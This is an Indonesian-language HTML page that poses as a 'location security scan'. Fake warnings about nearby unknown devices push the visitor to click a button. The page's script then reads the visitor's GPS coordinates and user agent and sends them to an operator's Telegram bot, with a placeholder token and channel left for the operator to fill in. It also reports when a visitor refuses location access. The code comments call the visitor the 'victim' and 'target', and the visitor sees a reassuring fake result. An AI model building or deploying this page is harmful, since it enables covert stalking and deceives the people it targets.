<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üîí Scan Lokasi Anda</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0e0e12;
      color: #00ffcc;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 30px;
      background: #13131a;
      border: 1px solid #00ffcc;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0, 255, 204, 0.1);
    }
    h1 {
      font-size: 24px;
      color: #ff3366;
      margin-bottom: 12px;
    }
    p {
      color: #00ff88;
      margin-bottom: 25px;
      font-size: 15px;
      line-height: 1.6;
    }
    .warning {
      background: #300;
      color: #ff6;
      padding: 12px;
      border-radius: 8px;
      margin: 20px 0;
      font-size: 14px;
      text-align: left;
    }
    button {
      padding: 14px 25px;
      background: #f00;
      color: #000;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
      margin-top: 10px;
    }
    #result {
      margin-top: 20px;
      padding: 15px;
      background: #000;
      color: #0f0;
      border: 1px dashed #0f0;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
      white-space: pre-wrap;
      display: none;
    }
    .footer {
      margin-top: 30px;
      font-size: 11px;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîç SCAN KEAMANAN LOKASI</h1>
    <p>
      Sistem mendeteksi aktivitas mencurigakan di sekitar Anda.  
      Klik tombol di bawah untuk memindai apakah lokasi Anda sedang diawasi.
    </p>

    <div class="warning">
      ‚ö†Ô∏è Peringatan: Ada 3 perangkat tidak dikenal dalam radius 50m dari lokasi Anda.
    </div>

    <button id="scan">MULAI SCAN SEKARANG</button>

    <pre id="result"></pre>

    <div class="footer">
      [ Sistem Keamanan Lokasi v1.1 ]
    </div>
  </div>

  <script>
    // üîë MASUKKAN TOKEN BOT KAMU DI SINI
    const TELEGRAM_BOT_TOKEN = '1234567890:ABCdefGhIJKlmnoPQRstuVWXyz'; // Ganti dengan token kamu

    document.getElementById('scan').onclick = function() {
      const btn = this;
      btn.disabled = true;
      btn.textContent = "Memindai...";

      setTimeout(() => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              const lat = pos.coords.latitude.toFixed(6);
              const lon = pos.coords.longitude.toFixed(6);
              const acc = pos.coords.accuracy;
              const time = new Date().toLocaleString();
              const url = `https://maps.google.com/?q=${lat},${lon}`;

              const text = `
üî¥ LOKASI TERDETEKSI (AUTO-BROADCAST)

üìå Latitude: ${lat}
üìå Longitude: ${lon}
üìè Akurasi: ¬±${acc} meter
üïí Waktu: ${time}
üåê Maps: ${url}

üì± User Agent: ${navigator.userAgent.replace(/\|/g, ' ')}
              `;

              // Kirim ke bot ‚Äî biarkan bot broadcast ke semua admin atau log
              try {
                // Kita kirim ke bot, dan harapkan bot punya fitur /myid atau log
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: '@YourBotNameLogs', // Ganti dengan username channel @namachannel
                    text: text,
                    parse_mode: 'Markdown'
                  })
                });
              } catch (e) {}

              // Alternatif: kirim ke grup atau channel kamu
              // Ganti @YourBotNameLogs dengan @namachannel kamu

              // Tampilkan hasil ke korban
              document.getElementById('result').innerHTML = `
üîç Lokasi: ${lat}, ${lon}
üì° Akurasi: ¬±${acc} meter
üïí Waktu: ${time}
‚úÖ Status: Tidak ada perangkat asing terdeteksi.

Terima kasih telah menggunakan layanan ini.
              `;
              document.getElementById('result').style.display = 'block';
            },
            async (err) => {
              let msg = 'Tidak diketahui';
              if (err.code === 1) msg = 'Ditolak oleh pengguna';
              if (err.code === 2) msg = 'Lokasi tidak tersedia';
              if (err.code === 3) msg = 'Timeout';

              // Kirim notifikasi ke bot bahwa korban buka link
              try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: '@YourBotNameLogs',
                    text: `‚ö†Ô∏è Target buka link tapi tolak lokasi.\nWaktu: ${new Date().toLocaleString()}`
                  })
                });
              } catch (e) {}

              document.getElementById('result').innerHTML = `
üî¥ SCAN GAGAL
üìù Alasan: ${msg}

Silakan aktifkan GPS dan coba lagi.
              `;
              document.getElementById('result').style.display = 'block';
            }
          );
        } else {
          document.getElementById('result').innerHTML = 'Browser tidak mendukung geolocation.';
          document.getElementById('result').style.display = 'block';
        }
      }, 1500);
    };

    // üïµÔ∏è‚Äç‚ôÇÔ∏è TRIK: Jika kamu belum punya ID, buat bot kamu kirim /myid ke kamu
    // Lalu buka bot kamu, ketik /myid ‚Üí dia kasih tahu ID kamu
  </script>
</body>
</html>
